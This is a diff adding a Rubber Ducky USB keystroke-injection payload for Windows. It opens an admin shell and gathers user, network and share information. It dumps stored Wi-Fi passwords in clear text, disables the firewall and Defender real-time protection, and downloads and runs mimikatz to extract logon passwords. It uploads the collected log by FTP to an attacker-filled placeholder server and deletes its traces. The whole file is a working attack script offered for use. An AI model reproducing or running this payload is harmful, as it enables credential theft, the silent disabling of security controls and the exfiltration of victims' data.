@@ -1,0 +1,118 @@
+rem tittle: Information Gatherin MSWindows for Rumpelstilsquin
+rem Payload for USB attack with rubber ducky
+rem Download correct mimikatz for architecture
+rem FTP upload file with information gathering 
+rem Remplace in <<x>>
+
+
+DELAY 3000
+CONTROL ESCAPE
+DELAY 1000
+CMD
+DELAY 1000
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT Y
+ENTER
+DELAY 300
+ENTER
+echo ============= SO version >> c:\pwlog.txt
+ENTER
+ver >> c:\pwlog.txt
+ENTER
+echo ============= User Account >> c:\pwlog.txt
+ENTER
+echo %username% >> c:\pwlog.txt
+ENTER
+echo ============= User Account >> c:\pwlog.txt
+ENTER
+net user >> c:\pwlog.txt
+ENTER
+echo =============  Share Folder >> c:\pwlog.txt
+ENTER
+net share >> c:\pwlog.txt
+ENTER
+echo ============= Drivers Conected >> c:\pwlog.txt
+ENTER
+fsutil fsinfo  drives >> c:\pwlog.txt
+ENTER
+echo ============= Network Configuration >> c:\pwlog.txt
+ENTER
+ipconfig /all >> c:\pwlog.txt
+ENTER
+echo ============= Routing Table >> c:\pwlog.txt
+ENTER
+route print >> c:\pwlog.txt 
+ENTER
+echo ============= ARP Table >> c:\pwlog.txt
+ENTER
+arp -a >> c:\pwlog.txt
+ENTER
+echo ============= WLAN Profile >> c:\pwlog.txt
+ENTER
+netsh wlan show profiles >> c:\pwlog.txt
+ENTER
+echo ============= WLAN Passwords >> c:\pwlog.txt 
+ENTER
+netsh wlan show profile name=* key=clear >> c:\pwlog.txt
+ENTER
+echo ============= Services Run >> c:\pwlog.txt
+ENTER
+netstat -aon >> c:\pwlog.txt
+ENTER
+echo ============= Firewall Desabled >> c:\pwlog.txt
+ENTER
+netsh advfirewall set currentprofile state off && netsh advfirewall set allprofiles state off >> c:\pwlog.txt
+ENTER
+REM Run MIMIKATZ
+REM ============= Windows Defender Desabled =============  
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+STRING powershell if ([System.IntPtr]::Size -eq 4) { (new-object System.Net.WebClient).DownloadFile('<<https://URL-MIMIKATZ-32BITS>>','%TEMP%\pw.exe');  }else{ (new-object System.Net.WebClient).DownloadFile('<<https://URL-MIMIKATZ-64BITS>>','%TEMP%\pw.exe');}
+ENTER
+%TEMP%\pw.exe >> c:\pwlog.txt & type pwlog.txt;
+ENTER
+privilege::debug
+ENTER
+DELAY 100
+sekurlsa::logonPasswords full
+ENTER
+DELAY 1000
+exit
+ENTER
+DELAY 300
+del %TEMP%\pw.exe
+ENTER
+DELAY 300
+powershell
+ENTER
+DELAY 300
+$source_folder="c:\pwlog.txt"
+ENTER
+ftp -i <<SERVER FTP>>
+ENTER
+DELAY 800
+<<SERVER USER FTP>> 
+ENTER
+DELAY 100
+<<SERVER PASSWORD FTP>>
+ENTER
+DELAY 400
+send
+ENTER
+c:\pwlog.txt
+ENTER
+<<SERVER PATH FTP>> 
+ENTER
+DELAY 1000
+quit 
+DELAY 300
+ENTER
+del c:\pwlog.txt 
+ENTER
+DELAY 300
+exit 
+ENTER
+exit 
+ENTER
+ 
